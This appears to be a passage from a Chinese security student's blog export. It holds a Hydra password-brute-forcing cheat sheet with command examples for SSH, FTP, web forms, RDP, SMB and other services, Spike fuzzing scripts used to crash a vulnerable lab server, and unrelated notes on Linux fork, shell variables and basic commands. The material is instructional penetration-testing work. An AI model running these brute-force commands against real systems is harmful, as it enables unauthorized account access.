&quot;generator&quot;: &#123;&quot;software&quot;: &quot;Hydra&quot;, &quot;version&quot;: &quot;v9.1&quot;, &quot;built&quot;: &quot;2020-09-29 15:44:43&quot;,&quot;server&quot;: &quot;127.0.0.1&quot;, &quot;service&quot;: &quot;ssh&quot;, &quot;jsonoutputversion&quot;: &quot;1.00&quot;,&quot;commandline&quot;: &quot;hydra -l root1 -p root1 -e ns -o b.json -b json 127.0.0.1 ssh&quot;&#125;,&quot;results&quot;: [],&quot;success&quot;: true,&quot;errormessages&quot;: [  ],&quot;quantityfound&quot;: 0   &#125;</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>项目组</category>
      
      <category>Hydra</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hydra</tag>
      
      <tag>渗透测试</tag>
      
      <tag>弱口令扫描</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hydra用法简记</title>
    <link href="/posts/78d34d76/"/>
    <url>/posts/78d34d76/</url>
    
    <content type="html"><![CDATA[<blockquote><p>hydra是著名黑客组织thc的一款开源的暴力密码破解<a href="https://github.com/vanhauser-thc/thc-hydra">工具</a>,可以在线破解多种密码。</p><p>官网:<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a></p><p>这款暴力密码破解工具相当强大,支持几乎所有协议的在线密码破解,其密码能否被破解关键在于字典是否足够强大。本文仅从安全角度去探讨测试,使用本文内容去做破坏者,与本人无关。</p></blockquote><h3 id="1-指令范式"><a href="#1-指令范式" class="headerlink" title="1.指令范式"></a>1.指令范式</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra [some command line options] [-s PORT] TARGET PROTOCOL [MODULE-OPTIONS]</code></pre></div><h3 id="2-参数选项"><a href="#2-参数选项" class="headerlink" title="2.参数选项"></a>2.参数选项</h3><p>使用option指定参数</p><blockquote><p>-R 根据上一次进度继续破解</p><p>-S 使用SSL协议连接</p><p>-s 指定端口,也可通过ip:port指定端口</p><p>-l 指定用户名</p><p>-L 指定用户名字典(文件)</p><p>-p 指定密码破解</p><p>-P 指定密码字典(文件)</p><p>-e ns 空密码探测和指定用户密码探测,n代表null尝试,代表密码同账户名尝试</p><p>-C 用户名可以用:分割(username:password)可以代替-l username -p password,同时支持该类型下的文件</p><p>-M 指定地址(文件)</p><p>-4/6 指定ipv4或ipv6(默认ipv4)</p><p>-o 输出文件</p><p>-t 指定多线程数量,默认为16个线程</p><p>-vV 显示详细过程</p><p>-f 当账号密码爆破成功时,不再继续进行(通常适用于单用户破解)</p><p>-x min:max:charset 生成密码字典,min最短长度,max最长长度,charset中a代表小写字母,A代表大写字母,1代表数字</p></blockquote><h3 id="3-指定IP"><a href="#3-指定IP" class="headerlink" title="3.指定IP"></a>3.指定IP</h3><ul><li>使用一个独立的IP或者DNS地址</li><li>使用CIDR类型的地址段,例<code>&quot;192.168.0.0/24&quot;</code></li><li>通过文件指定地址(使用参数选项 - M)</li><li>亦可通过新方式指定协议、地址、端口、可选项,例<code>ftp://192.168.33.44:22</code></li></ul><h3 id="4-指定协议"><a href="#4-指定协议" class="headerlink" title="4.指定协议"></a>4.指定协议</h3><p>在target之后指明协议。</p><blockquote><p>目前支持的协议类型有:Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, Radmin, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP</p></blockquote><h3 id="5-示例"><a href="#5-示例" class="headerlink" title="5.示例"></a>5.示例</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 破解ssh:hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip sshhydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 破解ftp:hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vVhydra ip ftp -l 用户名 -P 密码字典 -e ns -vV</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># get方式提交,破解web登录:hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get &#x2F;admin&#x2F;hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get &#x2F;admin&#x2F;index.php</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># post方式提交,破解web登录:hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form &#96;&#96;&quot;&#x2F;admin&#x2F;login.php:username&#x3D;^USER^&amp;password&#x3D;^PASS^&amp;submit&#x3D;login:sorry password&quot;</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form &quot;login.php:id&#x3D;^USER^&amp;passwd&#x3D;^PASS^:&lt;title&gt;wrong username or password&lt;&#x2F;title&gt;&quot;# 参数说明:-t同时线程数3,-l用户名是admin,字典pass.txt,保存为out.txt,-f 当破解了一个密码就停止,# 10.36.16.18目标ip,http-post-form表示破解是采用http的post方式提交的表单密码破解,&lt;title&gt;中的内容是表示错误猜解的返回信息提示。</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 破解https:hydra -m &#x2F;index.php -l muts -P pass.txt 10.36.16.18 https</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 破解teamspeak:hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 破解cisco:hydra -P pass.txt 10.36.16.18 ciscohydra -m cloud -P pass.txt 10.36.16.18 cisco-enable</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 破解smb:hydra -l administrator -P pass.txt 10.36.16.18 smb </code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 破解pop3:hydra -l muts -P pass.txt my.pop3.mail pop3</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 破解rdp:hydra ip rdp -l administrator -P pass.txt -V</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 破解http-proxy:hydra -l admin -P pass.txt http-proxy:&#x2F;&#x2F;10.36.16.18</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 破解imap:hydra -L user.txt -p secret 10.36.16.18 imap PLAINhydra -C defaults.txt -6 imap:&#x2F;&#x2F;[fe80::2c:31ff:fe12:ac11]:143&#x2F;PLAIN</code></pre></div><hr><blockquote><p>参考:</p><p><a href="https://github.com/vanhauser-thc/thc-hydra#special-options-for-modules">https://github.com/vanhauser-thc/thc-hydra#special-options-for-modules</a></p><p><a href="http://xstarcd.github.io/wiki/shell/hydra.html">http://xstarcd.github.io/wiki/shell/hydra.html</a></p><p><a href="https://yq.aliyun.com/articles/333121">https://yq.aliyun.com/articles/333121</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>项目组</category>
      
      <category>Hydra</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hydra</tag>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux fork机制</title>
    <link href="/posts/f55e6f79/"/>
    <url>/posts/f55e6f79/</url>
    
    <content type="html"><![CDATA[<h2 id="1-前导"><a href="#1-前导" class="headerlink" title="1. 前导"></a>1. 前导</h2><ol><li><p>进程可以看做程序的一次执行过程。在linux下，每个进程有唯一的PID标识进程。PID是一个从1到32768的正整数，其中1一般是特殊进程init，其它进程从2开始依次编号。当用完32768后，从2重新开始。</p></li><li><p>linux中有一个叫进程表的结构用来存储当前正在运行的进程。可以使用<code>ps aux</code>命令查看所有正在运行的进程。</p></li><li><p>进程在linux中呈树状结构，init为根节点，其它进程均有父进程，某进程的父进程就是启动这个进程的进程，这个进程叫做父进程的子进程。</p></li><li><p>fork的作用是<strong>复制一个与当前进程一样的进程</strong>。新进程的所有数据（变量、环境变量、程序计数器等）数值都和原进程一致，但是是一个全新的进程，并作为原进程的子进程。</p></li></ol><h3 id="fork函数"><a href="#fork函数" class="headerlink" title="fork函数"></a>fork函数</h3><ul><li>该进程为父进程时，返回子进程的pid</li><li>该进程为子进程时，返回0</li><li>fork执行失败，返回-1</li></ul><p>其实根据名字十分形象，fork叉子分叉：</p><p><img src="/posts/f55e6f79/fork.png"></p><h2 id="2-例题"><a href="#2-例题" class="headerlink" title="2. 例题"></a>2. 例题</h2><p>在网上看fork机制<a href="https://www.jianshu.com/p/1327c51a4a99">文章</a>中发现一道不错帮助理解的例题，特此记录。</p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">&#x2F;* 已知从这个程序执行到这个程序的所有进程结束这个时间段内，没有其它新进程执行。1、请说出执行这个程序后，将一共运行几个进程。2、如果其中一个进程的输出结果是“pid1:1001, pid2:1002”，写出其他进程的输出结果（不考虑进程执行顺序）。*&#x2F;int mian()&#123;pid_t pid1;pid_t pid2;pid1 &#x3D; fork();pid2 &#x3D; fork();printf(&quot;pid1:%d,pid2:%d\n&quot;,pid1,pid2);&#125;</code></pre></div><h3 id="2-1-解题关键"><a href="#2-1-解题关键" class="headerlink" title="2.1 解题关键"></a>2.1 解题关键</h3><p>解题的关键就是要认识到fork将程序切成两段。看下图：</p><p><img src="/posts/f55e6f79/ex.png"></p><p> 上图表示一个含有fork的程序，而fork语句可以看成将程序切为A、B两个部分。然后整个程序会如下运行：</p><ol><li>设由shell直接执行程序，生成了进程P。P执行完Part. A的所有代码。</li><li>当执行到<code>pid = fork();</code>时，P启动一个进程Q，Q是P的子进程，和P是同一个程序的进程。Q继承P的所有变量、环境变量、程序计数器的当前值。</li><li>在P进程中，fork()<strong>将Q的PID返回给变量pid</strong>，并继续执行Part. B的代码。</li><li>在进程Q中，<strong>将0赋给pid</strong>，并继续执行Part. B的代码。</li></ol><p>这里有三个点非常关键:</p><ol><li>P执行了所有程序，而Q只执行了Part. B，即fork()后面的程序。（这是因为Q继承了P的PC-程序计数器）</li><li>Q继承了fork()语句执行时当前的环境，而不是程序的初始环境。</li><li>P中fork()语句启动子进程Q，并将Q的PID返回，而Q中的fork()语句不启动新进程，仅将0返回。</li></ol><h3 id="2-2-解题过程"><a href="#2-2-解题过程" class="headerlink" title="2.2 解题过程"></a>2.2 解题过程</h3><p>下面利用上文阐述的知识进行解题。这里我把两个问题放在一起进行分析。</p><ol><li><p>从shell中执行此程序，启动了一个进程，我们设这个进程为P0，设其PID为XXX（解题过程不需知道其PID）。</p></li><li><p>当执行到pid1 = fork();时，P0启动一个子进程P1，由题目知P1的PID为1001。我们暂且不管P1。</p></li><li><p>P0中的fork返回1001给pid1，继续执行到pid2 = fork();，此时启动另一个新进程，设为P2，由题目知P2的PID为1002。同样暂且不管P2。</p></li><li><p>P0中的第二个fork返回1002给pid2，继续执行完后续程序，结束。所以，P0的结果为“pid1:1001, pid2:1002”。</p></li><li><p>再看P2，P2生成时，P0中pid1=1001，所以P2中pid1继承P0的1001，而作为子进程pid2=0。P2从第二个fork后开始执行，结束后输出“pid1:1001, pid2:0”。</p></li><li><p>接着看P1，P1中第一条fork返回0给pid1，然后接着执行后面的语句。而后面接着的语句是pid2 = fork();执行到这里，P1又产生了一个新进程，设为P3。先不管P3。</p></li><li><p>P1中第二条fork将P3的PID返回给pid2，由预备知识知P3的PID为1003，所以P1的pid2=1003。P1继续执行后续程序，结束，输出“pid1:0, pid2:1003”。</p></li><li><p>P3作为P1的子进程，继承P1中pid1=0，并且第二条fork将0返回给pid2，所以P3最后输出“pid1:0, pid2:0”。</p></li><li><p>至此，整个执行过程完毕。</p></li></ol><h3 id="2-3-所得答案"><a href="#2-3-所得答案" class="headerlink" title="2.3 所得答案"></a>2.3 所得答案</h3><p>   1、一共执行了四个进程。（P0, P1, P2, P3）</p><p>   2、另外几个进程的输出分别为：</p><p>   pid1:1001, pid2:0</p><p>   pid1:0, pid2:1003</p><p>   pid1:0, pid2:0</p><hr><blockquote><p>参考：</p><p><a href="https://www.jianshu.com/p/1327c51a4a99">https://www.jianshu.com/p/1327c51a4a99</a></p><p><a href="https://zhuanlan.zhihu.com/p/36872365">https://zhuanlan.zhihu.com/p/36872365</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>fork</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Spike简单测试使用</title>
    <link href="/posts/c0dbeb78/"/>
    <url>/posts/c0dbeb78/</url>
    
    <content type="html"><![CDATA[<blockquote><p>之前了解了一下Spike模糊测试框架，本文记录一下使用过程中遇到的问题与使用测试结果。</p></blockquote><h2 id="1-编译问题"><a href="#1-编译问题" class="headerlink" title="1. 编译问题"></a>1. 编译问题</h2><h3 id="macos编译"><a href="#macos编译" class="headerlink" title="macos编译"></a>macos编译</h3><p>使用macos编译出现一些问题，未再考虑。</p><p><img src="/posts/c0dbeb78/lib_mac.png"></p><h3 id="centos编译"><a href="#centos编译" class="headerlink" title="centos编译"></a>centos编译</h3><p>centos编译结果正常，但是运行过程中显示一个库文件<code>libdlrpc.so</code>引用失败。如图：</p><p><img src="/posts/c0dbeb78/lib_linux.png"></p><p>根据查找，运行<code>src</code>下<code>ld.sh</code>脚本导入环境变量解决。</p><p>注：通过<code>source ld.sh</code>或<code>. ./ld.sh</code>运行，通过<code>./ld.sh</code>则无法解决。原因参见<a href="https://leex0.top/2020/08/11/shell%E8%84%9A%E6%9C%AC%E8%AE%BE%E7%BD%AE%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%97%AE%E9%A2%98/">此文章</a>。</p><p><code>ld.sh</code>如下：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">#Use this to use any of the generic programs#try using . .&#x2F;ld.sh if it&#39;s not workingexport LD_LIBRARY_PATH&#x3D;.</code></pre></div><h2 id="2-vulnserver程序测试"><a href="#2-vulnserver程序测试" class="headerlink" title="2. vulnserver程序测试"></a>2. vulnserver程序测试</h2><p>通过使用vulnserver，测试spike能否正确使用。</p><p>脚本如下：</p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">s_readline();s_string(&quot;TRUN&quot;);s_string_variable(&quot;COMMAND&quot;);</code></pre></div><p>攻击端（CentOS）<code>./generic_send_tcp 10.xx.xx.xx 9999 vul_test.spk 0 0</code>：</p><p><img src="/posts/c0dbeb78/vul_fuzz.png"></p><p>服务器端（WindowsXP）程序崩溃：</p><p><img src="/posts/c0dbeb78/vul_error.png"></p><h2 id="3-flask-web测试"><a href="#3-flask-web测试" class="headerlink" title="3. flask web测试"></a>3. flask web测试</h2><p>搭建一个简单的web服务器(<code>python flask</code>)测试spike使用。</p><p>攻击脚本如下：</p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">s_string(&quot;GET &#x2F; HTTP&#x2F;1.1\r\n&quot;);s_string(&quot;Host: 10.37.129.5:5000\r\n&quot;);s_string(&quot;User-Agent: &quot;);s_string(&quot;Content-Length: &quot;);s_blocksize_string(&quot;block1&quot;, 5); s_string(&quot;\r\nConnection: close\r\n\r\n&quot;);s_block_start(&quot;block1&quot;);s_string(&quot;inputvar&#x3D;&quot;);s_block_end(&quot;block1&quot;);</code></pre></div><p>攻击端（CentOS）<code>./generic_send_tcp 10.37.129.5 5000 flask.spk 0 0</code>：</p><p><img src="/posts/c0dbeb78/flask_fuzz.png"></p><p>服务器端（Ubuntu）：</p><p><img src="/posts/c0dbeb78/flask_run.png"></p>]]></content>
    
    
    <categories>
      
      <category>项目组</category>
      
      <category>模糊测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Spike</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shell脚本设置环境变量问题</title>
    <link href="/posts/74cee2a8/"/>
    <url>/posts/74cee2a8/</url>
    
    <content type="html"><![CDATA[<blockquote><p>在编写框架的初始化编译脚本的过程中，需要向系统导入一个环境变量。</p><p>期望导入<code>LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$path</code></p><p>使用<code>sh init.sh</code>后，发现环境变量并未导入。</p></blockquote><p>脚本内容简单，如下：</p><div class="code-wrapper"><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">.&#x2F;configure &amp;&amp; make clean &amp;&amp; makepath&#x3D;$(pwd)LD_LIBRARY_PATH&#x3D;$LD_LIBRARY_PATH:$pathexport LD_LIBRARY_PATHldconfig</code></pre></div><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><ul><li>使用<code>source init.sh</code>可以解决问题（具有权限情况下）。</li></ul><h2 id="问题原因"><a href="#问题原因" class="headerlink" title="问题原因"></a>问题原因</h2><ul><li><p>使用 <code>sh</code> 命令来执行shell脚本的时候，脚本实际是在<code>sh</code>创建的子shell中执行。</p></li><li><p>所以当<code>sh</code>进程完成的时候并没有修改系统变量，所以通过执行 <code>sh init.sh </code>来修改系统变量是无效的。</p></li></ul><h3 id="Q1-父子Shell-与-环境变量"><a href="#Q1-父子Shell-与-环境变量" class="headerlink" title="Q1. 父子Shell 与 环境变量"></a>Q1. 父子Shell 与 环境变量</h3><ul><li>执行程序通常可以理解为parent process所产生的child process，child执行完后再返回到parent。这一现象在Linux中成为<code>fork</code>。子进程产生时会从父进程处<strong>获得资源分配与继承环境</strong>，<strong>所谓环境变量其实就是会传给子进程的变量</strong>。</li><li>通常是，<strong>子shell会继承所有父shell的变量</strong>（可以直接引用）。父shell的变量包括<strong>所有export导出的环境变量和当前环境下设置的变量</strong>（形如var=value）的命令。</li><li>从 process 的观念来看，是 <strong>parent process 产生一个 child process 去执行</strong>，当 child 结束后，会返回 parent ，但 parent 的环境是不会因 child 的改变而改变的。</li></ul><h3 id="Q2-source-与-sh-与-xxx-执行脚本的区别"><a href="#Q2-source-与-sh-与-xxx-执行脚本的区别" class="headerlink" title="Q2. source(.) 与 sh 与 ./xxx 执行脚本的区别"></a>Q2. source(.) 与 sh 与 ./xxx 执行脚本的区别</h3><ul><li><p>对于脚本xxx.sh来说，<code>. ./xxx.sh</code>与<code>source ./xxx.sh</code>相同，与<code>./xxx.sh</code>和<code>sh xxx.sh</code>均不同。</p></li><li><p><code>./xxx.sh</code>——首先你会查找脚本第一行是否指定了解释器，如果没指定，那么就用当前系统默认的shell(大多数linux默认是bash)，如果指定了解释器，那么就将该脚本交给指定的解释器。</p></li><li><p><code>sh xxx.sh</code>——表示我使用sh来解释这个脚本，可以不要执行权限。</p></li><li><p>正常来说，当我们执行一个 shell script 时，其实是先<strong>产生一个 sub-shell 的子进程</strong>，然后 sub-shell 再去产生命令行的子进程。（<code>sh</code>执行脚本的一般方式）</p></li><li><p>所谓<code>source</code>就是让 script 在<strong>当前 shell 内执行而不是产生一个 sub-shell 来执行</strong>。<br>由于所有执行结果均于当前 shell 内完成，若 script 的环境有所改变，当然也会改变当前环境。<br><em>可以理解为source是把脚本内容一行一行读到父shell里挨着执行。</em></p></li></ul><hr><blockquote><p>参考：</p><p><a href="http://bbs.chinaunix.net/thread-2211666-1-1.html">http://bbs.chinaunix.net/thread-2211666-1-1.html</a></p><p><a href="https://www.zhihu.com/question/41441630/answer/91061860">https://www.zhihu.com/question/41441630/answer/91061860</a>  - Virtual的回答</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Shell</tag>
      
      <tag>环境变量</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>模糊测试与Spike框架简介</title>
    <link href="/posts/2a175e95/"/>
    <url>/posts/2a175e95/</url>
    
    <content type="html"><![CDATA[<h2 id="1-内容介绍"><a href="#1-内容介绍" class="headerlink" title="1. 内容介绍"></a>1. 内容介绍</h2><h3 id="1-1-模糊测试简介"><a href="#1-1-模糊测试简介" class="headerlink" title="1.1 模糊测试简介"></a>1.1 模糊测试简介</h3><p>模糊测试（Fuzzing），是一种通过向目标系统提供非预期的输入并监视异常结果来发现软件漏洞的方法。<br>其核心思想是自动或半自动的生成随机数据输入到一个程序中，并监控目标程序异常，如崩溃，断言(assertion)失败，以发现可能的程序错误，比如内存泄漏等。<br>即用随机坏数据（也称做 fuzz）攻击一个程序，然后等着观察哪里遭到了破坏。但这一过程却能揭示出程序中的重要 bug。<br>它是一种介于完全的手工渗透测试与完全的自动化测试之间的安全性测试类型。它充分利用了机器能够随机生成和发送数据的能力。</p><h3 id="1-2-Spike框架"><a href="#1-2-Spike框架" class="headerlink" title="1.2 Spike框架"></a>1.2 Spike框架</h3><p>Spike是一个模糊器创建工具包，它提供了API，允许用户基于网络的协议来创建自己的fuzzer。其中包含一些通用的模糊测试器。</p><h3 id="1-3-网络协议模糊测试"><a href="#1-3-网络协议模糊测试" class="headerlink" title="1.3 网络协议模糊测试"></a>1.3 网络协议模糊测试</h3><p>对网络协议进行模糊测试也需要识别出可被攻击的接口，通过变异或生成方式得到能够触发错误的模糊测试值，然后将这些模糊测试值发送给目标应用，监视目标应用的错误。</p><h2 id="2-基本过程"><a href="#2-基本过程" class="headerlink" title="2. 基本过程"></a>2. 基本过程</h2><ul><li>确定测试的目标</li><li>确定输入的向量</li><li>生成模糊测试数据，可由测试工具通过随机或是半随机的方式生成</li><li>执行模糊数据测试</li><li>监视异常</li><li>判定发现的漏洞是否可能被利用</li></ul><h2 id="3-测试方法分类"><a href="#3-测试方法分类" class="headerlink" title="3. 测试方法分类"></a>3. 测试方法分类</h2><ul><li>基于<code>变异</code>的模糊测试——简而言之就是正常调用协议，抓包，然后混淆数据包达到生成异常数据包的结果，从而进行测试。</li></ul><blockquote><p>这种方法对已有的正常数据集依赖较高。需要有足够丰富的合法输入从而产生足够丰富的测试类型。</p></blockquote><p>例如，png图片除了文件头后面数据内容进行置换混淆得到异常测试数据。</p><p><img src="/posts/2a175e95/png1.png"></p><ul><li>基于<code>生成</code>的模糊测试——简而言之就是理解协议规约定义，创建文法自动生成动态模糊的测试用例。</li></ul><blockquote><p>这种方法对协议的理解掌握程度需求更高。难度更大。</p></blockquote><h2 id="4-困难点"><a href="#4-困难点" class="headerlink" title="4. 困难点"></a>4. 困难点</h2><p>协议分析，对于特定的程序与配套协议，需要对程序段进行逆向分析才能得到<br>协议内容以创建测试样例，而其中逆向分析工作难度与工作量都较大。</p>]]></content>
    
    
    <categories>
      
      <category>项目组</category>
      
      <category>模糊测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Spike</tag>
      
      <tag>模糊测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux基础知识复习(1)--基本命令</title>
    <link href="/posts/331f8832/"/>
    <url>/posts/331f8832/</url>
    
    <content type="html"><![CDATA[<p>很久没有使用Linux，基础知识也忘了不少。</p><p>找了本<a href="https://www.linuxprobe.com/docs/LinuxProbe.pdf">参考书</a>顺带复习一下Linux的部分基础知识。</p><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><h3 id="常用工作命令"><a href="#常用工作命令" class="headerlink" title="常用工作命令"></a>常用工作命令</h3><ul><li><p><code>echo</code>：用于在终端输出字符串或变量提取后的值</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ echo Hello!Hello!$ echo $SHELL&#x2F;bin&#x2F;bash</code></pre></div></li><li><p><code>reboot</code>：重启系统</p></li><li><p><code>poweroff</code>：关闭系统</p></li><li><p><code>wget</code>：下载网络文件</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ wget http:&#x2F;&#x2F;www.linuxprobe.com&#x2F;docs&#x2F;LinuxProbe.pdf</code></pre></div></li><li><p><code>ps</code>：查看系统中的进程状态</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ ps -a(all) -u(user)</code></pre></div></li><li><p><code>top</code>：动态地监视进程活动与系统负载等信息</p></li><li><p><code>pidof</code>：查询某个指定服务进程的 PID 值</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ pidof sshd23587 798</code></pre></div></li><li><p><code>kill</code>：终止某个指定 PID 的服务进程</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ kill 23587</code></pre></div></li><li><p><code>killall</code>：终止某个指定名称的服务所对应的全部进程</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ killall sshd</code></pre></div></li></ul><h3 id="系统状态命令"><a href="#系统状态命令" class="headerlink" title="系统状态命令"></a>系统状态命令</h3><ul><li><code>ifconfig</code>：用于获取网卡配置与网络状态等信息</li><li><code>uname</code>：用于查看系统内核与系统版本等信息 -a</li><li><code>free</code>：用于显示当前系统中内存的使用量信息</li><li><code>who</code>：用于查看当前登入主机的用户终端信息(whoami)</li><li><code>history</code>：用于显示历史执行过的命令（清除 -c）</li></ul><h3 id="目录切换命令"><a href="#目录切换命令" class="headerlink" title="目录切换命令"></a>目录切换命令</h3><ul><li><code>pwd</code>：显示用户当前所处的工作目录</li><li><code>cd</code>：切换工作路径</li><li><code>ls</code>：显示目录中文件信息（所有文件-a，详细信息-l）</li></ul><h3 id="文件编辑命令"><a href="#文件编辑命令" class="headerlink" title="文件编辑命令"></a>文件编辑命令</h3><ul><li><p><code>cat</code>：查看纯文本文件（较少）</p></li><li><p><code>more </code>：查看纯文本文件（较多）</p></li><li><p><code>head</code>：查看纯文本文档的前 n行</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ head -n 20 &#x2F;etc&#x2F;passwd</code></pre></div></li><li><p><code>tail</code>：查看纯文本文档的后 N 行或持续刷新内容</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ tail -n 20 &#x2F;etc&#x2F;passwd$ tail -f &#x2F;var&#x2F;log&#x2F;message</code></pre></div></li><li><p><code>tr</code>：替换文本文件中的字符</p>  <div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ cat anaconda-ks.cfg | tr [a-z] [A-Z]</code></pre></div></li><li><p><code>wc</code>：统计指定文本的行数-l、字数-w、字节数-c</p>  <div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ wc -l &#x2F;etc&#x2F;passwd</code></pre></div></li><li><p><code>stat</code>：查看文件的具体存储信息和时间等信息</p>  <div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ stat &#x2F;etc&#x2F;passwd</code></pre></div></li><li><p><code>diff</code>：比较多个文本文件的差异</p>  <div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ diff diff_a.txt diff_b.txt</code></pre></div></li></ul><h3 id="目录管理命令"><a href="#目录管理命令" class="headerlink" title="目录管理命令"></a>目录管理命令</h3><ul><li><p><code>touch</code>：创建空白文件或设置文件的时间</p>  <div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ touch touch_a.txt</code></pre></div></li><li><p><code>mkdir</code>：创建空白目录</p>  <div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ mkdir ~&#x2F;mkdir_a</code></pre></div></li><li><p><code>cp</code>：用于复制文件和目录</p>  <div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ cp install.log x.log$ cp -r &#x2F;etc ~&#x2F;mkdir_a </code></pre></div></li><li><p><code>mv</code>：剪切文件或将文件重命名</p>  <div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ mv x.log linux.log</code></pre></div></li><li><p><code>rm</code>：删除文件或目录</p>  <div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ rm -f install.log$ rm -rf ~&#x2F;mkdir_a</code></pre></div></li><li><p><code>dd</code>：按照指定大小和个数的数据块来复制文件或转换文件</p>  <div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;560_file count&#x3D;1 bs&#x3D;560M# if为输入文件，of为输出文件，count为块数 bs为每个块大小1+0 records in1+0 records out587202560 bytes (587 MB, 560 MiB) copied, 3.49432 s, 168 MB&#x2F;s</code></pre></div></li><li><p><code>file</code>：查看文件的类型</p>  <div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ file 560_file560_file: data</code></pre></div></li></ul><h3 id="压缩搜索命令"><a href="#压缩搜索命令" class="headerlink" title="压缩搜索命令"></a>压缩搜索命令</h3><ul><li><p><code>tar</code>：对文件进行打包压缩或解压</p>  <div 